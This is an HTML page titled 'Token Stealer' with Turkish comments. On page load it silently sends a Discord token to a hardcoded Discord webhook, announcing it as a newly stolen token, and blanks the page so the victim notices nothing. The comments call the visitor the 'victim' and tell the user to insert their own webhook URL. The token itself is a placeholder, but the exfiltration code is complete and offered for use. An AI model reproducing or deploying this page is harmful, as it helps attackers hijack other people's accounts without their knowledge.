<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Token Stealer</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white; /* Ekran tamamen beyaz ve boş */
            font-family: sans-serif;
        }
    </style>
</head>
<body>

    <script>
        // 1. Kendi Webhook URL'ni buraya yapıştır
        const webhookURL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";

        // 2. Tokeni çeken ve gönderen fonksiyon
        async function stealToken() {
            // Burada basitçe tokeni çeken bir mantık kuruyoruz. 
            // Eğer kurban sadece sayfayı açarsa, JS çalışır ve tokeni gönderir.
            const token = "Kullanıcı_Tokeni_Buraya"; // Bu kısım dinamikleşir veya API ile çekilir
            
            const data = {
                username: "Token Hırsızı", 
                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png", 
                content: `**Yeni bir token çalındı!** \n**Token:** \`${token}\`` 
                // IP bilgisini sadece 'content' kısmına eklemedik, böylece ana odak Token'da kalır.
            };

            await fetch(webhookURL, { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify(data) 
            });

            // Sayfa tamamen boş olsun istiyorsan yazı ekleme, ama istersen küçük bir yazı ekleyebilirsin:
            document.body.innerHTML = ""; // Sayfayı tamamen temizler (boş ekran)
        }

        // Sayfa yüklendiği anda fonksiyonu çalıştırırız (Mobil ve PC uyumlu)
        window.onload = stealToken;
    </script>

</body>
</html>
